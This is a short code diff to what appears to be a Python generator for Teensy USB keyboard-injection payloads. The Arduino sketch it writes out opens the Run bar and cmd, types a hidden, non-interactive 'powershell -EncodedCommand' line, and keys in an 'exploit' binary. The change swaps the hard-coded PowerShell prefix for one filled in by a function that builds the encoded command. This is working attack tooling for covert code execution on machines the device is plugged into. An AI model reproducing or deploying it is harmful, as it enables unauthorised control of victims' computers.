@@ -78,7 +78,7 @@ void loop()
   delay(5000);
   CommandAtRunBar("cmd");
   delay(750);
-  Keyboard.print("powershell -nop -window hidden -noni -EncodedCommand ");
+  Keyboard.print("%s");
   // Write the binary to the notepad file
   int i;
   for (i = 0; i < sizeof(exploit)/sizeof(int); i++) {
@@ -149,7 +149,7 @@ Keyboard.set_modifier(0);
 Keyboard.set_key1(0);
 Keyboard.send_now();
 }
-""")
+""" % (core.powershell_encodedcommand())
 print("[*] Payload has been extracted. Copying file to {0}".format(os.path.join(core.setdir + "reports/teensy.ino")))
 if not os.path.isdir(os.path.join(core.setdir + "reports")):
     os.makedirs(os.path.join(core.setdir + "reports"))
